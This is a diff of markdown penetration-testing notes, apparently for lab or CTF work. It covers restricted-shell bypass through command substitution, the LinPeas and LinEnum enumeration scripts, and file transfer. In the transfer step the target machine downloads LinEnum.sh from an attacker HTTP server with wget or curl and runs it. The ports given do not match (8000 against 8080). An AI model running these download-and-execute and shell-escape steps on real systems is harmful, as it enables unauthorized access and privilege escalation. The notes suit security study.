@@ -13,49 +13,39 @@ export TERM=xterm
 export TERM=linux
 ```
 ---
-## Restricted Shells**
-When we are in a restricted shell, such as: **RBASH**, **RKSH**, **RZSH**. That is, we cannot execute commands like **`cd`**, etc. To check which shell we are in:
+## Restricted Shells
+Restricted shells, such as: **RBASH**, **RKSH**, **RZSH**. In which we can't execute commands like **`cd`**, etc. First check which shell we are in:
 
   ```bash
   echo $0
   echo $SHELL
   ```
-
-  We can run commands inserted inside commands that we have permission for, e.g.:
+We can run commands inserted inside commands that we have permission for, e.g.:
 
   ```bash
   ls whoami
   ls $(id)
   ```
 
-  [**https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)    !!**
+  [https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
 
-  Ask the chat, in this case try first to enumerate with **`compgen -c`** or **`echo *`** to see the available commands.
-
-  research..
-
-  ---
-
+  We can enumerate the available commands with **`compgen -c`** or **`echo *`**.
+  
 ---
 
-* LinPeas and LinEnum
+## LinPeas and LinEnum
 
-  * `SimpleHTTPServer` or `wget` to download to the machine.
   * **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
   * **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
 
-  ---
+---
 
-* Transferring files (wget, curl & scp)
+## Transferring files (wget, curl & scp)
+**SCP:**
+  * on our machine, in the directory where we have the file, we open a server:
 
-  * We can transfer files like the vulnerability enumeration script for privilege escalation (linenum.sh) using **WGET,** **CURL, SCP** or when there is some firewall on the target machine that prevents transferring files, we can bypass it with **BASE64.**
-  * **WGET / CURL:**
-
-    * on our machine, in the directory where we have the file, we open a server:
-
-      * `python3 -m http.server 8000`
+    * `python3 -m http.server 8000`
     * now on the target machine we can use either WGET or CURL:
-
       * `wget http://10.10.14.199:8080/LinEnum.sh`
       * `curl http://10.10.14.199:8080/LinEnum.sh -o LinEnum.sh`
     * Now just `chmod +x LinEnum.sh` and run it.
